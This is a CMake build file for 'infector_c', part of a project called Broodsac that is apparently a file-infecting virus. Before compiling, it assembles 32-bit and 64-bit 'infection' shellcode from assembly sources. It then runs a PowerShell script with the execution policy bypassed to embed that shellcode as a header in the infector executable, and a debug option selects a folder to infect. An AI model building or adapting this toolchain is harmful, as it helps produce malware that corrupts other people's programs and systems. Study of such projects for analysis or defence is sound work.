cmake_minimum_required(VERSION 3.15)

project(infector_c C ASM_NASM)
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
option(BROODSAC_DEBUG "Turn on debugging for Broodsac" OFF)
set(BROODSAC_INFECTABLES "" CACHE STRING "Set the folder for Broodsac to infect, only relevant with BROODSAC_DEBUG")

add_executable(infector_c main.c)
add_custom_command(TARGET infector_c
  PRE_BUILD
  COMMAND ${CMAKE_ASM_NASM_COMPILER} ARGS
  -f bin
  -o "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection32.bin"
  -D TLS
  "${CMAKE_CURRENT_SOURCE_DIR}/../../infection/asm/32/main.asm")
add_custom_command(TARGET infector_c
  PRE_BUILD
  COMMAND ${CMAKE_ASM_NASM_COMPILER} ARGS
  -f bin
  -o "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection64.bin"
  -D TLS
  "${CMAKE_CURRENT_SOURCE_DIR}/../../infection/asm/64/main.asm")
add_custom_command(TARGET infector_c
  PRE_BUILD
  COMMAND powershell ARGS
  -ExecutionPolicy bypass
  -File "${CMAKE_CURRENT_SOURCE_DIR}/headers.ps1"
  -infection32 "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection32.bin"
  -infection64 "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infection64.bin"
  -output "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>/infections.h")

target_include_directories(infector_c PUBLIC
  "${CMAKE_CURRENT_BINARY_DIR}/$<CONFIG>")

if (BROODSAC_DEBUG)
  cmake_path(ABSOLUTE_PATH BROODSAC_INFECTABLES NORMALIZE)
  cmake_path(NATIVE_PATH BROODSAC_INFECTABLES)
  target_compile_definitions(infector_c PUBLIC
    BROODSAC_DEBUG
    BROODSAC_INFECTABLES="${BROODSAC_INFECTABLES}")
endif()
